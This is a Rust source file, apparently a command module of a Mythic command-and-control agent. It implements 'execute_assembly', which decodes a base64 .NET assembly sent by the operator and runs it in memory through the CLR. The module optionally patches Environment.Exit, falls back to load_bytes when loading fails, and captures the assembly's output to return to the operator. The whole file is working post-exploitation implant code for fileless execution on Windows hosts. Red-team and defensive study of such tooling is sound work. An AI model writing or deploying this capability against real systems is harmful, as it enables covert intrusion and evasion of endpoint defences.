//! Execute a .NET assembly in-process via rustclr.
//!
//! Windows only. The Mythic container fetches the selected assembly and sends
//! it as base64 in `assembly_b64`; the agent decodes it and executes the CLR
//! entry point from memory.

use mythic::{TaskMessage, TaskResponse};
use serde::Deserialize;

#[derive(Deserialize)]
#[cfg_attr(not(windows), allow(dead_code))]
struct Params {
    assembly_b64: String,
    #[serde(default)]
    assembly_arguments: String,
    #[serde(default = "default_true")]
    patch_exit: bool,
}

fn default_true() -> bool {
    true
}

#[cfg_attr(not(any(windows, test)), allow(dead_code))]
fn format_execute_error(err: impl std::fmt::Display) -> String {
    let message = err.to_string();
    if message.contains("-2147024894") || message.contains("0x80070002") {
        return format!(
            "{message} (0x80070002: CLR could not find the assembly, a dependency, or the required .NET runtime on the target)"
        );
    }
    message
}

#[cfg(windows)]
fn is_load2_file_not_found(err: &impl std::fmt::Display) -> bool {
    let message = err.to_string();
    message.contains("Load_2")
        && (message.contains("-2147024894") || message.contains("0x80070002"))
}

#[cfg(windows)]
fn split_args(input: &str) -> Vec<String> {
    let mut args = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;
    let mut escaped = false;

    for ch in input.chars() {
        if escaped {
            cur.push(ch);
            escaped = false;
            continue;
        }
        if ch == '\\' {
            escaped = true;
            continue;
        }
        match quote {
            Some(q) if ch == q => quote = None,
            Some(_) => cur.push(ch),
            None if ch == '"' || ch == '\'' => quote = Some(ch),
            None if ch.is_whitespace() => {
                if !cur.is_empty() {
                    args.push(std::mem::take(&mut cur));
                }
            }
            None => cur.push(ch),
        }
    }
    if escaped {
        cur.push('\\');
    }
    if !cur.is_empty() {
        args.push(cur);
    }
    args
}

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => {
            return TaskResponse::failed(task.id, &format!("execute_assembly parse error: {e}"));
        }
    };

    #[cfg(not(windows))]
    {
        let _ = params;
        TaskResponse::failed(task.id, "execute_assembly is only supported on Windows")
    }

    #[cfg(windows)]
    {
        use rustclr::{ClrOutput, RuntimeVersion, RustClrEnv, variant::create_safe_array_args};

        let assembly = match crate::common::base64::decode(&params.assembly_b64) {
            Ok(bytes) => bytes,
            Err(e) => return TaskResponse::failed(task.id, &e),
        };
        let args = split_args(&params.assembly_arguments);
        let arg_refs = args.iter().map(String::as_str).collect::<Vec<_>>();

        let mut clr = match rustclr::RustClr::new(assembly.as_slice()) {
            Ok(c) => c.with_output().with_args(arg_refs),
            Err(e) => return TaskResponse::failed(task.id, &format!("rustclr init failed: {e}")),
        };
        if params.patch_exit {
            clr = clr.with_patch_exit();
        }

        let output = match clr.run() {
            Ok(output) => output,
            Err(e) if is_load2_file_not_found(&e) => {
                let env = match RustClrEnv::new(Some(RuntimeVersion::V4)) {
                    Ok(env) => env,
                    Err(fallback_err) => {
                        return TaskResponse::failed(
                            task.id,
                            &format!(
                                "execute_assembly failed: {}; load_bytes fallback init failed: {}",
                                format_execute_error(e),
                                fallback_err
                            ),
                        );
                    }
                };
                let loaded = match env.app_domain.load_bytes(assembly.as_slice()) {
                    Ok(loaded) => loaded,
                    Err(fallback_err) => {
                        return TaskResponse::failed(
                            task.id,
                            &format!(
                                "execute_assembly failed: {}; load_bytes fallback failed: {}",
                                format_execute_error(e),
                                fallback_err
                            ),
                        );
                    }
                };
                let mscorlib = match env.app_domain.get_assembly("mscorlib") {
                    Ok(mscorlib) => mscorlib,
                    Err(fallback_err) => {
                        return TaskResponse::failed(
                            task.id,
                            &format!(
                                "execute_assembly load_bytes fallback could not resolve mscorlib: {}",
                                fallback_err
                            ),
                        );
                    }
                };
                let mut output_manager = ClrOutput::new(&mscorlib);
                if let Err(fallback_err) = output_manager.redirect() {
                    return TaskResponse::failed(
                        task.id,
                        &format!(
                            "execute_assembly load_bytes fallback output redirect failed: {}",
                            fallback_err
                        ),
                    );
                }
                let safe_args = match create_safe_array_args(args.clone()) {
                    Ok(safe_args) => safe_args,
                    Err(fallback_err) => {
                        return TaskResponse::failed(
                            task.id,
                            &format!(
                                "execute_assembly load_bytes fallback arg marshaling failed: {}",
                                fallback_err
                            ),
                        );
                    }
                };
                if let Err(fallback_err) = loaded.run(safe_args) {
                    return TaskResponse::failed(
                        task.id,
                        &format!(
                            "execute_assembly load_bytes fallback invocation failed: {}",
                            fallback_err
                        ),
                    );
                }
                let mut output = match output_manager.capture() {
                    Ok(output) => output,
                    Err(fallback_err) => {
                        return TaskResponse::failed(
                            task.id,
                            &format!(
                                "execute_assembly load_bytes fallback output capture failed: {}",
                                fallback_err
                            ),
                        );
                    }
                };
                if params.patch_exit {
                    output = format!(
                        "[!] Load_2 failed; used load_bytes fallback without Environment.Exit patch.\n{}",
                        output
                    );
                }
                output
            }
            Err(e) => {
                return TaskResponse::failed(
                    task.id,
                    &format!("execute_assembly failed: {}", format_execute_error(e)),
                );
            }
        };

        TaskResponse {
            task_id: task.id,
            completed: Some(true),
            status: Some("completed".into()),
            user_output: Some(output),
            ..Default::default()
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(windows)]
    #[test]
    fn test_split_args_quotes() {
        assert_eq!(
            split_args(r#"triage "/user:alice bob" /nowrap"#),
            vec!["triage", "/user:alice bob", "/nowrap"]
        );
    }

    #[test]
    fn test_parse_requires_assembly() {
        let task = TaskMessage {
            command: "execute_assembly".into(),
            parameters: "{}".into(),
            ..Default::default()
        };
        let resp = handle(&task);
        assert_eq!(resp.status.as_deref(), Some("error"));
    }

    #[test]
    fn test_format_execute_error_expands_file_not_found_hresult() {
        let formatted = format_execute_error("Load_2 failed with HRESULT: -2147024894");
        assert!(formatted.contains("0x80070002"));
        assert!(formatted.contains("dependency"));
    }
}
